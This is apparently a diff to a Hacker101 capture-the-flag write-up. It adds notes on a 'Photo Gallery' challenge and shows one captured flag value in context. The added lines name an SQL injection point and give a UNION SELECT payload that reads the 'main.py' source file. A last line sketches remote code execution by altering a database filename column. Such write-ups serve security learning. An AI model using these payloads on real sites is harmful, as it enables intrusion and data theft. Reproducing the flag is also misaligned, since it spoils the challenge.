@@ -44,5 +44,9 @@ Flag 2: `^FLAG^bd75d9a3aba5709358c413cd1f69819783524094e15dd117c569bdb9f0006a06$
 
 ## Photo Gallery
 
+- SQLi in `https://6b6c2ec7bb58b712c873fbbd19cd1a32.ctf.hacker101.com/fetch?id=1`
+- File read via SQLi `https://6b6c2ec7bb58b712c873fbbd19cd1a32.ctf.hacker101.com/fetch?id=4+UNION+SELECT+'main.py'--`
+- RCE via modifying `filename` column in `photos` table
+
 
 
